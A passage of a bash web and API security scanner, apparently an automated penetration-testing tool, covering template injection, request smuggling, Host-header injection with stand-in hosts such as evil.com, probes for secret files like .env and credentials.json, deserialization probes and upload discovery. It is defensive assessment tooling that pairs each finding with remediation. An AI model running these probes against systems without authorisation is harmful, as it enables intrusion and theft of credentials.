            local resp
            resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}/?${param}=${encoded}" | head -c 512 || true)
            echo "[T13] ${param}=${probe:0:20} → ${resp:0:100}" >> "$evfile"

            if echo "$resp" | grep -qE "(^49$|>49<|\"49\"|value=49|:49 |49\b)" || \
               echo "$resp" | grep -q "7777777"; then
                emit_finding "critical" \
                    "Server-Side Template Injection (SSTI) Detected (${ip}:${port})" \
                    "Template expression '${probe}' evaluated to expected value in parameter '${param}' at ${base_url}. SSTI allows arbitrary code execution on the server." \
                    "Avoid rendering user-supplied input as templates. Use sandboxed template environments with strict variable escaping. Prefer logic-less templates (Mustache). Upgrade affected template engines and apply security patches." \
                    "ev-09-${ip//./_}-t13-ssti"
                return
            fi
            _tier_sleep
        done
    done

    log_ok "T13: No SSTI detected in automated probes"
}

# =============================================================================
# MRK:09_T14 — T14 HTTP SMUGGLING | t14,http,smuggling,cl,te | L1270-1322
# NAV-RULE: read-toc-first; deep-only
# =============================================================================

test_14_smuggling() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t14-smuggling" "txt")"
    log "T14: HTTP Request Smuggling — ${base_url}"
    echo "[WARNING] Smuggling probes may cause unintended side effects on shared frontends." >> "$evfile"

    # CL.TE probe
    local cl_te_payload="POST / HTTP/1.1\r\nHost: ${ip}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED"
    local clte_resp
    clte_resp=$(_curl -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 4" \
        -d $'1\r\nA\r\n0\r\n\r\n' \
        "${base_url}/" || true)
    echo "[T14] CL.TE probe response: ${clte_resp:0:200}" >> "$evfile"
    _tier_sleep

    # TE.CL probe
    local tecl_resp
    tecl_resp=$(_curl -X POST \
        -H "Transfer-Encoding: chunked" \
        -H "Content-Length: 6" \
        -d $'0\r\n\r\n' \
        "${base_url}/" || true)
    echo "[T14] TE.CL probe response: ${tecl_resp:0:200}" >> "$evfile"
    _tier_sleep

    # TE.TE obfuscation
    local obfusc_resp
    obfusc_resp=$(_curl -X POST \
        -H "Transfer-Encoding: chunked" \
        -H "Transfer-Encoding: cow" \
        -d $'0\r\n\r\n' \
        "${base_url}/" || true)
    echo "[T14] TE.TE obfuscation response: ${obfusc_resp:0:200}" >> "$evfile"
    _tier_sleep

    if echo "${clte_resp}${tecl_resp}${obfusc_resp}" | grep -qiE "(timeout|400 Bad Request|500|smuggl)"; then
        emit_finding "high" \
            "Potential HTTP Request Smuggling Indicator (${ip}:${port})" \
            "HTTP request smuggling probes (CL.TE and TE.CL) produced unusual responses at ${base_url}. Manual validation with Burp Suite's HTTP Request Smuggler extension required to confirm exploitability." \
            "Ensure consistent TE/CL header handling across all proxies and backends. Configure frontend proxies to reject ambiguous requests. Use HTTP/2 throughout where possible." \
            "ev-09-${ip//./_}-t14-smuggling"
    fi
    log_warn "T14: Manual validation with Burp Suite HTTP Request Smuggler recommended"
}

# =============================================================================
# MRK:09_T15 — T15 HOST HEADER INJECTION | t15,host,header,injection,ssrf | L1323-1372
# NAV-RULE: read-toc-first
# =============================================================================

test_15_host_header() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t15-host-header" "txt")"
    log "T15: Host Header Injection — ${base_url}"

    local evil_hosts=("evil.com" "attacker.io" "169.254.169.254" "localhost" "127.0.0.1" "${ip}.evil.com")

    for evil in "${evil_hosts[@]}"; do
        local resp
        resp=$(_curl -D - -H "Host: ${evil}" "${base_url}/" | head -c 512 || true)
        echo "[T15] Host: ${evil} → ${resp:0:200}" >> "$evfile"

        # Check if host is reflected in Location header (redirect hijack)
        if echo "$resp" | grep -i "^Location:" | grep -qi "$evil"; then
            emit_finding "high" \
                "Host Header Injection — Redirect Hijacking (${ip}:${port})" \
                "The response to Host: ${evil} contains a Location header reflecting the injected host. This enables redirect hijacking, password reset poisoning, and cache poisoning attacks." \
                "Never use the Host header to construct URLs for redirects or emails. Use a hardcoded base URL from server configuration. Validate Host against an explicit allowlist." \
                "ev-09-${ip//./_}-t15-host-redirect"
        fi

        # Check if host is reflected in response body (cache poisoning)
        if echo "$resp" | grep -qi "$evil"; then
            emit_finding "medium" \
                "Host Header Value Reflected in Response Body (${ip}:${port})" \
                "Injected Host: ${evil} is reflected in the HTTP response body. Combined with caching, this enables web cache poisoning and targeted phishing." \
                "Sanitize Host header before using in templates or responses. Configure explicit server_name/ServerName rather than relying on Host header." \
                "ev-09-${ip//./_}-t15-host-reflect"
        fi

        # X-Forwarded-Host override
        local xfh_resp
        xfh_resp=$(_curl -D - -H "X-Forwarded-Host: ${evil}" "${base_url}/" | head -c 512 || true)
        echo "[T15] X-Forwarded-Host: ${evil} → ${xfh_resp:0:200}" >> "$evfile"
        if echo "$xfh_resp" | grep -qi "$evil"; then
            emit_finding "medium" \
                "X-Forwarded-Host Header Injection (${ip}:${port})" \
                "X-Forwarded-Host: ${evil} is reflected in the response. Applications trusting this header are vulnerable to cache poisoning and SSRF via header manipulation." \
                "Only trust X-Forwarded-Host from known reverse proxies. Validate against an allowlist of legitimate hostnames." \
                "ev-09-${ip//./_}-t15-xfh"
        fi
        _tier_sleep
    done
}

# =============================================================================
# MRK:09_T16 — T16 API VERSIONING | t16,api,versioning,v1,v2 | L1373-1413
# NAV-RULE: read-toc-first
# =============================================================================

test_16_versioning() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t16-versioning" "txt")"
    log "T16: API Versioning / Shadow APIs — ${base_url}"

    local versions=("v1" "v2" "v3" "v0" "v1.0" "v1.1" "v2.0" "beta" "alpha" "dev" "test" "internal" "old" "legacy" "2020" "2021" "2022" "2023")
    local resources=("users" "admin" "config" "settings" "debug" "health" "status" "metrics" "internal" "private")

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    local shadow_apis=""
    for ver in "${versions[@]}"; do
        for res in "${resources[@]}"; do
            local ep="${base_url}/api/${ver}/${res}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
            echo "[T16] ${ep} → HTTP ${code}" >> "$evfile"
            if [[ "$code" =~ ^(200|201)$ ]]; then
                shadow_apis+="${ver}/${res}(${code}) "
                log_warn "T16: Shadow API found: ${ep}"
            fi
            _tier_sleep
        done
    done

    if [[ -n "$shadow_apis" ]]; then
        emit_finding "high" \
            "Shadow/Undocumented API Versions Exposed (${ip}:${port})" \
            "Legacy or undocumented API versions are accessible: ${shadow_apis}. Shadow APIs often lack current security controls, authentication requirements, and input validation (OWASP API9)." \
            "Maintain a complete API inventory. Decommission all legacy API versions. Enforce the same security controls across all API versions. Use API gateways to centralize version management." \
            "ev-09-${ip//./_}-t16-shadow-api"
    else
        log_ok "T16: No shadow API versions detected"
    fi
}

# =============================================================================
# MRK:09_T17 — T17 SENSITIVE DATA EXPOSURE | t17,sensitive,data,exposure,pii | L1414-1474
# NAV-RULE: read-toc-first
# =============================================================================

test_17_sensitive_data() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t17-sensitive" "txt")"
    log "T17: Sensitive Data Exposure — ${base_url}"

    local sensitive_paths=(
        "/.env" "/.env.local" "/.env.production" "/.env.backup"
        "/.git/config" "/.git/HEAD" "/.git/index"
        "/backup.sql" "/database.sql" "/db.sql" "/dump.sql"
        "/config.json" "/config.yaml" "/config.yml"
        "/credentials.json" "/secrets.json" "/secrets.yaml"
        "/wp-config.php.bak" "/web.config.bak"
        "/.htpasswd" "/.htaccess"
        "/phpinfo.php" "/info.php" "/test.php"
        "/server-status" "/server-info"
        "/actuator" "/actuator/env" "/actuator/health" "/actuator/metrics"
        "/actuator/dump" "/actuator/trace" "/actuator/beans"
        "/metrics" "/health" "/debug" "/debug/vars"
        "/api/debug" "/api/internal" "/internal"
        "/__debug__" "/console" "/rails/info"
        "/robots.txt" "/sitemap.xml" "/.well-known/security.txt"
        "/crossdomain.xml" "/clientaccesspolicy.xml"
    )

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    for path in "${sensitive_paths[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${path}" || true)
        echo "[T17] ${path} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201)$ ]]; then
            local body; body=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}${path}" | head -c 256 || true)
            echo "[T17] Exposed: ${path} — ${body:0:150}" >> "$evfile"
            local sev="medium"
            echo "$path" | grep -qE "(\.env|\.git|\.sql|credentials|secrets|htpasswd|config)" && sev="critical"
            emit_finding "$sev" \
                "Sensitive File Exposure — ${path} (${ip}:${port})" \
                "Sensitive file ${path} is publicly accessible (HTTP ${code}). Content snippet: ${body:0:150}" \
                "Remove all sensitive files from web root. Add appropriate deny rules in web server configuration. Implement file-type restrictions and path-based access controls." \
                "ev-09-${ip//./_}-t17-sensitive"
        fi
        _tier_sleep
    done

    # Check API responses for PII patterns
    local api_resp; api_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}${API_BASE}/${API_VERSION}/users" | head -c 1024 || true)
    if echo "$api_resp" | grep -qiE "([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]{2,}|password|ssn|credit_card|card_number|cvv|dob|date_of_birth)"; then
        echo "[T17] PII detected in API response" >> "$evfile"
        emit_finding "high" \
            "PII/Sensitive Data Exposure in API Response (${ip}:${port})" \
            "API response from ${base_url}${API_BASE}/${API_VERSION}/users contains PII or sensitive fields (email, password hash, SSN, or financial data). Snippet: ${api_resp:0:200}" \
            "Apply field-level authorization — return only fields the requester is authorized to see. Mask sensitive fields (e.g., return last 4 digits of card). Audit all API responses for excessive data exposure (OWASP API3)." \
            "ev-09-${ip//./_}-t17-pii"
    fi
}

# =============================================================================
# MRK:09_T18 — T18 BUSINESS LOGIC | t18,business,logic,workflow,flow | L1475-1527
# NAV-RULE: read-toc-first
# =============================================================================

test_18_business_logic() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t18-business" "txt")"
    log "T18: Business Logic / BFLA — ${base_url}"

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    # BFLA: Access admin functions as regular user
    local admin_endpoints=("${base_url}/api/admin/users"
                           "${base_url}/api/admin/config"
                           "${base_url}${API_BASE}/${API_VERSION}/admin"
                           "${base_url}/manage/users"
                           "${base_url}/admin/api/users"
                           "${base_url}/api/internal/admin")

    for ep in "${admin_endpoints[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
        echo "[T18] BFLA ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201)$ ]]; then
            emit_finding "high" \
                "Broken Function Level Authorization (BFLA) — Admin Endpoint Accessible (${ip}:${port})" \
                "Admin/privileged endpoint ${ep} is accessible with current authorization level (HTTP ${code}). This indicates missing function-level access control (OWASP API5)." \
                "Implement role-based access control (RBAC) at the function level. Deny-by-default: require explicit authorization grants for privileged operations. Separate admin APIs from user-facing APIs." \
                "ev-09-${ip//./_}-t18-bfla"
        fi
        _tier_sleep
    done

    # Negative price / quantity manipulation
    local cart_ep="${base_url}${API_BASE}/${API_VERSION}/cart"
    local code; code=$(_curl -o /dev/null -w "%{http_code}" "${auth_args[@]+"${auth_args[@]}"}" "$cart_ep" || true)
    if [[ ! "$code" =~ ^(404|000)$ ]]; then
        local neg_resp
        neg_resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"item_id":1,"quantity":-1,"price":-100}' \
            "${auth_args[@]+"${auth_args[@]}"}" "$cart_ep" || true)
        echo "[T18] Negative price/qty probe: ${neg_resp:0:200}" >> "$evfile"
        if echo "$neg_resp" | grep -qiE "(success|created|accepted|order_id)"; then
            emit_finding "high" \
                "Business Logic Flaw — Negative Price/Quantity Accepted (${ip}:${port})" \
                "Cart endpoint ${cart_ep} accepted negative quantity/price values. Business logic flaws can allow items to be purchased for free or credits to be generated." \
                "Validate all numeric inputs server-side: enforce positive values, range limits, and integer constraints. Never rely on client-side validation for business-critical values." \
                "ev-09-${ip//./_}-t18-neg-price"
        fi
    fi
}

# =============================================================================
# MRK:09_T19 — T19 WEBSOCKET DETECTION | t19,websocket,detection,ws,upgrade | L1528-1562
# NAV-RULE: read-toc-first
# =============================================================================

test_19_websocket() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t19-websocket" "txt")"
    log "T19: WebSocket Detection — ${base_url}"

    local ws_paths=("/ws" "/websocket" "/socket" "/socket.io" "/sockjs"
                    "/realtime" "/live" "/events" "/stream" "/feed"
                    "/api/ws" "/api/websocket" "/api/realtime")

    for path in "${ws_paths[@]}"; do
        local resp
        resp=$(_curl -D - \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Version: 13" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            "${base_url}${path}" | head -c 512 || true)
        echo "[T19] WS probe ${path}: ${resp:0:200}" >> "$evfile"
        if echo "$resp" | grep -qiE "(101 Switching|Upgrade: websocket|Sec-WebSocket-Accept)"; then
            emit_finding "info" \
                "WebSocket Endpoint Detected — Manual Testing Required (${ip}:${port})" \
                "WebSocket endpoint found at ${base_url}${path}. WebSocket connections bypass some HTTP security controls. Manual testing required for: authentication enforcement, origin validation, message injection, DoS via large messages." \
                "Enforce WebSocket authentication. Validate Origin header against an allowlist. Implement message rate limiting and size limits. Use WSS (TLS) exclusively." \
                "ev-09-${ip//./_}-t19-websocket"
            log_info "T19: WebSocket detected at ${path}"
        fi
        _tier_sleep
    done
}

# =============================================================================
# MRK:09_T20 — T20 TLS & TRANSPORT CHECKS | t20,tls,transport,checks,cipher | L1563-1633
# NAV-RULE: read-toc-first
# =============================================================================

test_20_tls_transport() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t20-tls" "txt")"
    log "T20: TLS / Transport Security — ${base_url}"

    # Only meaningful on TLS ports
    if ! echo "$TLS_PORTS" | grep -qw "$port"; then
        log_info "T20: Port ${port} is not TLS — checking HTTP→HTTPS redirect"
        local http_base="http://${ip}:${port}"
        local resp; resp=$(_curl -D - -o /dev/null "${http_base}/" || true)
        local loc; loc=$(echo "$resp" | grep -i "^Location:" | head -1 | tr -d '\r' || true)
        echo "[T20] HTTP redirect: ${loc}" >> "$evfile"
        if [[ -z "$loc" ]] || ! echo "$loc" | grep -qi "^https://"; then
            emit_finding "medium" \
                "No HTTP to HTTPS Redirect (${ip}:${port})" \
                "Port ${port} does not redirect HTTP traffic to HTTPS. Clients may transmit sensitive data over unencrypted connections." \
                "Configure permanent (301) redirect from HTTP to HTTPS. Enable HSTS to prevent HTTP access." \
                "ev-09-${ip//./_}-t20-http-redirect"
        fi
        return
    fi

    # TLS certificate info
    local cert_info
    cert_info=$(echo | openssl s_client -connect "${ip}:${port}" -servername "$ip" 2>/dev/null | \
        openssl x509 -noout -subject -issuer -dates -fingerprint 2>/dev/null || true)
    echo "[T20] Cert: ${cert_info}" >> "$evfile"

    # Check for expired or soon-expiring cert
    local not_after; not_after=$(echo | openssl s_client -connect "${ip}:${port}" -servername "$ip" 2>/dev/null | \
        openssl x509 -noout -enddate 2>/dev/null | cut -d= -f2 || true)
    echo "[T20] Not After: ${not_after}" >> "$evfile"
    if [[ -n "$not_after" ]]; then
        local exp_epoch; exp_epoch=$(date -d "$not_after" +%s 2>/dev/null || true)
        local now_epoch; now_epoch=$(date +%s)
        local days_left=$(( (exp_epoch - now_epoch) / 86400 ))
        echo "[T20] Days until expiry: ${days_left}" >> "$evfile"
        if [[ "$days_left" -lt 0 ]]; then
            emit_finding "critical" "TLS Certificate Expired (${ip}:${port})" \
                "TLS certificate expired ${days_left#-} days ago. All connections are insecure." \
                "Renew certificate immediately. Configure automated renewal (Let's Encrypt certbot, ACM)." \
                "ev-09-${ip//./_}-t20-cert-expired"
        elif [[ "$days_left" -lt 30 ]]; then
            emit_finding "medium" "TLS Certificate Expiring Soon — ${days_left} Days (${ip}:${port})" \
                "TLS certificate expires in ${days_left} days. Service disruption imminent." \
                "Renew certificate and configure automated renewal monitoring." \
                "ev-09-${ip//./_}-t20-cert-expiry"
        fi
    fi

    # SSLv3/TLSv1.0/TLSv1.1 detection
    for weak_proto in ssl3 tls1 tls1_1; do
        local proto_resp
        proto_resp=$(echo | openssl s_client -connect "${ip}:${port}" -"${weak_proto}" 2>&1 | head -5 || true)
        echo "[T20] ${weak_proto}: ${proto_resp:0:100}" >> "$evfile"
        if echo "$proto_resp" | grep -q "CONNECTED"; then
            local proto_name; proto_name="${weak_proto/tls1_1/TLSv1.1}"; proto_name="${proto_name/tls1/TLSv1.0}"; proto_name="${proto_name/ssl3/SSLv3}"
            emit_finding "high" \
                "Weak TLS Protocol Accepted — ${proto_name} (${ip}:${port})" \
                "Server accepts deprecated protocol ${proto_name} which is vulnerable to POODLE, BEAST, and related downgrade attacks." \
                "Disable all protocols below TLS 1.2. Configure: ssl_protocols TLSv1.2 TLSv1.3 (Nginx) or SSLProtocol TLSv1.2 TLSv1.3 (Apache)." \
                "ev-09-${ip//./_}-t20-${weak_proto}"
        fi
    done
}

# =============================================================================
# MRK:09_T21 — T21 PACKAGE MANIFEST EXPOSURE | t21,package,manifest,osv,ecosystem | L1636-XXXX | ⚠ read-toc-first
# NAV-RULE: read-toc-first
# Probes for exposed package manifests (package.json, requirements.txt, etc.)
# Emits:
#   - emit_finding("low") for each exposed manifest (information disclosure)
#   - emit_package_finding("info") per extracted package — consumed by step 14 T03 (OSV sweep)
# =============================================================================

test_21_package_manifests() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t21-pkg-manifests" "txt")"
    log "T21: Package Manifest Exposure — ${base_url}"

    # manifest → ecosystem (colon-separated pairs)
    local -a manifest_map=(
        "package.json:npm"
        "requirements.txt:PyPI"
        "Pipfile:PyPI"
        "go.mod:Go"
        "pom.xml:Maven"
        "Gemfile.lock:RubyGems"
        "composer.json:Packagist"
    )

    local found_any=0

    local entry
    for entry in "${manifest_map[@]}"; do
        local mfile="${entry%%:*}" eco="${entry##*:}"
        local url="${base_url}/${mfile}"

        local http_code
        http_code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
        [[ "$http_code" != "200" ]] && continue

        local body
        body=$(_curl "$url" 2>/dev/null | head -200 || true)
        [[ -z "$body" ]] && continue

        # Sanity-check: confirm this looks like the expected manifest type
        case "$mfile" in
            package.json)    echo "$body" | grep -q '"name"'      || continue ;;
            requirements.txt) echo "$body" | grep -qP '^[A-Za-z]' || continue ;;
            go.mod)          echo "$body" | grep -q '^module'     || continue ;;
            pom.xml)         echo "$body" | grep -q '<project'    || continue ;;
            Gemfile.lock)    echo "$body" | grep -q 'GEM'         || continue ;;
            composer.json)   echo "$body" | grep -q '"require"'   || continue ;;
            Pipfile)         echo "$body" | grep -q '\[packages\]' || continue ;;
        esac

        found_any=1
        echo "[T21] ${mfile} exposed (HTTP ${http_code})" >> "$evfile"
        echo "$body" | head -30 >> "$evfile"

        emit_finding "low" \
            "Package Manifest Exposed — /${mfile} (${ip}:${port})" \
            "The file /${mfile} is publicly accessible at ${url}. Package manifests expose exact dependency versions, aiding targeted CVE identification and exploitation. Ecosystem: ${eco}." \
            "Deny access to manifest files in your web server config. Add location blocks (Nginx) or Deny directives (.htaccess/Apache) for: package.json, requirements.txt, go.mod, pom.xml, Gemfile.lock, composer.json, Pipfile." \
            "ev-09-${ip//./_}-t21-${mfile//./_}"

        # Extract package names (max 10 per manifest)
        local -a pkgs=()
        case "$mfile" in
            package.json)
                local pname
                pname=$(echo "$body" | grep -m1 '"name"' \
                    | sed 's/.*"name"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/' \
                    | tr -d '\r\n ')
                [[ -n "$pname" ]] && pkgs+=("$pname")
                # top-level dependencies
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" \
                    | grep -oP '"[^"]+"\s*:\s*"\^?[0-9~*][^"]*"' \
                    | grep -oP '^"[^"]+"' | tr -d '"' \
                    | grep -v '^version$\|^name$\|^description$\|^main$\|^license$\|^author$' \
                    | head -9)
                ;;
            requirements.txt)
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" | grep -oP '^[A-Za-z0-9_.-]+' | head -10)
                ;;
            Pipfile)
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" \
                    | awk '/^\[packages\]/{p=1;next} /^\[/{p=0} p && /=/{print $1}' \
                    | head -10)
                ;;
            go.mod)
                local mod
                mod=$(echo "$body" | grep '^module' | awk '{print $2}' | head -1 | tr -d '\r\n')
                [[ -n "$mod" ]] && pkgs+=("$mod")
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" | grep -P '^\t[^\t]' | awk '{print $1}' | head -9)
                ;;
            pom.xml)
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" | grep -oP '(?<=<artifactId>)[^<]+' | head -10)
                ;;
            Gemfile.lock)
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" | grep -oP '^\s{4}[a-zA-Z0-9_-]+' | tr -d ' ' | head -10)
                ;;
            composer.json)
                while IFS= read -r dep; do
                    [[ -n "$dep" ]] && pkgs+=("$dep")
                done < <(echo "$body" \
                    | grep -oP '"[a-zA-Z0-9_.-]+/[a-zA-Z0-9_.-]+"' \
                    | tr -d '"' | head -10)
                ;;
        esac

        local pkg_count=0
        local pkg
        for pkg in "${pkgs[@]+"${pkgs[@]}"}"; do
            [[ "$pkg_count" -ge 10 ]] && break
            [[ -z "$pkg" ]] && continue
            emit_package_finding "info" \
                "Package Detected — ${pkg} (${eco}, ${ip}:${port})" \
                "Package '${pkg}' (ecosystem: ${eco}) identified from exposed /${mfile} at ${ip}:${port}. Step 14 (Vuln Corpus) will query OSV.dev for known vulnerabilities in this package." \
                "Keep ${pkg} up to date. Review https://osv.dev/list?ecosystem=${eco}&q=${pkg} for advisories. Remove manifest exposure (see related low finding)." \
                "$pkg" "$eco" \
                "ev-09-${ip//./_}-t21-${mfile//./_}"
            (( pkg_count++ )) || true
        done

        log_ok "T21: /${mfile} — ${pkg_count} package(s) emitted [${eco}]"
    done

    [[ "$found_any" -eq 0 ]] && log_info "T21: No exposed package manifests found at ${base_url}"
}

# =============================================================================
# MRK:09_T22 — T22 DESERIALIZATION ATTACK SURFACE | t22,deserial,java,php,dotnet,viewstate | LXXXX-XXXX
# ⚠ read-toc-first
# =============================================================================

test_22_deserialization() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t22-deserial" "txt")"
    log "T22: Deserialization Attack Surface — ${base_url}"

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    # --- Java: magic-bytes probe via temp file (bash strips NUL in $()) ---
    local java_probe_f
    java_probe_f=$(mktemp /tmp/ptorc_java_probe_XXXXXX.bin)
    printf '\xac\xed\x00\x05\x73\x72\x00\x05\x44\x75\x6d\x6d\x79' > "$java_probe_f"
    local java_endpoints=("${base_url}/api/data" "${base_url}/api/v1/data"
                          "${base_url}/ws/service" "${base_url}/api/import"
                          "${base_url}/service" "${base_url}/rmi")
    local java_hit=0
    for ep in "${java_endpoints[@]}"; do
        local code
        code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/x-java-serialized-object" \
            --data-binary "@${java_probe_f}" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
        echo "[T22] Java magic-bytes probe ${ep} → HTTP ${code}" >> "$evfile"
        # 400/500 = server accepted and parsed (not 415 Unsupported Media Type)
        if [[ "$code" =~ ^(200|201|400|500)$ ]]; then
            emit_finding "high" \
                "Potential Java Deserialization Endpoint — Verify with ysoserial (${ip}:${port})" \
                "Endpoint ${ep} accepted Java serialized object Content-Type with HTTP ${code} (not 415 Unsupported). Manual testing with ysoserial gadget chains (CommonsCollections, Spring, etc.) is required to confirm exploitability." \
                "Implement JVM deserialization filters (ObjectInputFilter, SerialKiller). If not required, disable Java serialization. Replace with JSON/XML for inter-service communication." \
                "ev-09-${ip//./_}-t22-java-deserial"
            java_hit=1
            break
        fi
        _tier_sleep
    done
    rm -f "$java_probe_f"

    # --- Java: error-signature scan in response body ---
    if [[ "$java_hit" -eq 0 ]]; then
        local java_sig_resp
        java_sig_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}/api/import" 2>/dev/null | head -c 512 || true)
        echo "[T22] Java error-sig scan: ${java_sig_resp:0:100}" >> "$evfile"
        if echo "$java_sig_resp" | grep -qiE "(ClassNotFoundException|ObjectInputStream|SerializationException|InvalidClassException|java\.lang\.)"; then
            emit_finding "critical" \
                "Java Deserialization Error Signature in Response (${ip}:${port})" \
                "Response from ${base_url}/api/import contains Java deserialization error keywords, confirming an active ObjectInputStream pipeline is network-reachable." \
                "Implement JVM deserialization filters (ObjectInputFilter). Replace native Java serialization with JSON. Apply CommonsCollections/Spring gadget-chain mitigations." \
                "ev-09-${ip//./_}-t22-java-error"
        fi
        _tier_sleep
    fi

    # --- PHP: unserialize() sink probe ---
    local php_probe_encoded
    php_probe_encoded=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("O:8:\"stdClass\":0:{}"))' 2>/dev/null \
        || echo 'O%3A8%3A%22stdClass%22%3A0%3A%7B%7D')
    local php_resp
    php_resp=$(_curl -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "data=${php_probe_encoded}" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        "${base_url}/api/data" 2>/dev/null | head -c 256 || true)
    echo "[T22] PHP unserialize probe: ${php_resp:0:100}" >> "$evfile"
    if echo "$php_resp" | grep -qiE "(unserialize|__wakeup|__destruct|Fatal error|PHP Error|Allowed memory)"; then
        emit_finding "critical" \
            "PHP Deserialization Sink — unserialize() Reachable (${ip}:${port})" \
            "PHP deserialization error keywords appeared in response to a serialized object probe at ${base_url}/api/data. PHP gadget chains via __wakeup/__destruct magic methods can lead to RCE." \
            "Never pass user-controlled data to unserialize(). Use json_decode() instead. If required, restrict unserialize() with the allowed_classes parameter." \
            "ev-09-${ip//./_}-t22-php-deserial"
    fi
    _tier_sleep

    # --- .NET: ViewState presence and MAC enforcement check ---
    local html_resp
    html_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}/" 2>/dev/null | head -c 4096 || true)
    if echo "$html_resp" | grep -qi '__VIEWSTATE'; then
        echo "[T22] ViewState detected" >> "$evfile"
        local vs_value
        vs_value=$(echo "$html_resp" | grep -oiP '(?<=id="__VIEWSTATE" value=")[^"]+' | head -1 || true)
        if [[ -n "$vs_value" && "${#vs_value}" -lt 100 ]]; then
            emit_finding "medium" \
                ".NET ViewState — Suspiciously Short ViewState Detected (${ip}:${port})" \
                "ViewState at ${base_url}/ is unusually short (${#vs_value} chars), suggesting MAC protection may be disabled (enableViewStateMac=false). If confirmed, ysoserial.net gadget chains can achieve RCE via a crafted ViewState." \
                "Ensure enableViewStateMac=true and ViewStateEncryptionMode=Always in web.config. Use a strong, unique MachineKey. Verify with Blacklist3r to rule out known MachineKey exposure." \
                "ev-09-${ip//./_}-t22-viewstate"
        else
            emit_finding "info" \
                ".NET ViewState Present — MAC Enforcement Verification Recommended (${ip}:${port})" \
                "ASP.NET ViewState found on ${base_url}. Manual verification with Blacklist3r/ysoserial.net is recommended to confirm MAC enforcement and rule out known MachineKey leaks." \
                "Verify enableViewStateMac=true in web.config. Ensure MachineKey is unique and not derived from known defaults." \
                "ev-09-${ip//./_}-t22-viewstate-info"
        fi
    fi

    log_ok "T22: Deserialization surface assessment complete"
}

# =============================================================================
# MRK:09_T23 — T23 FILE UPLOAD BYPASS | t23,upload,bypass,magic,mime,double,ext | LXXXX-XXXX
# ⚠ read-toc-first
# =============================================================================

test_23_file_upload_bypass() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t23-upload-bypass" "txt")"
    log "T23: File Upload Security Bypass — ${base_url}"

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    # Discover upload endpoints
    local upload_paths=("/upload" "/api/upload" "/api/v1/upload" "/file/upload"
                        "/files/upload" "/image/upload" "/api/files" "/media/upload"
                        "/api/media" "/documents/upload" "/attachments"
                        "${API_BASE}/${API_VERSION}/upload"
                        "${API_BASE}/${API_VERSION}/files")
    local -a upload_endpoints=()
    for path in "${upload_paths[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" -X POST \
            "${auth_args[@]+"${auth_args[@]}"}" "${base_url}${path}" || true)
        echo "[T23] Upload probe ${path} → HTTP ${code}" >> "$evfile"
        # 400/422/415 = endpoint exists but rejected our (empty) request
        if [[ "$code" =~ ^(200|201|400|422|415)$ ]]; then
            upload_endpoints+=("${base_url}${path}")
        fi
        _tier_sleep
    done

    if [[ "${#upload_endpoints[@]}" -eq 0 ]]; then
